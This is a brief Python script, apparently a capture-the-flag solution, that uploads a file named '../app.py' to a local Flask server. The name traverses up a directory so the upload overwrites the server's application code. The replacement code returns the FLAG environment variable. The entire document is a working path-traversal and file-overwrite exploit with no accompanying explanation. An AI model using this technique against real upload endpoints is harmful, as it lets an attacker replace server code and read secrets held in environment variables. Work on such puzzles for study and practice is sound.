import requests

payload = """
from flask import Flask
import os

app = Flask(__name__)

@app.route("/")
def index():
    return os.environ["FLAG"]
"""

requests.post("http://localhost:5000", files={'file': ('../app.py', payload)})
